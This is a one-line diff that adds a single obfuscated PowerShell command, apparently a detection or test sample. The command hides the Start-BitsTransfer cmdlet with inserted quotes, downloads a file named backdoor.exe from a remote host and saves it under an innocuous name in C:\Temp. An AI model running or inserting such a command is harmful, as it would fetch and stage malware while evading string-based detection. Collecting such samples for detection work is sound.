@@ -1,0 +1,1 @@
+powershell.exe -Command St""art-B"its"Trans"f"er -Source http://another.remote/backdoor.exe -Destination C:\Temp\thisisfine.exe
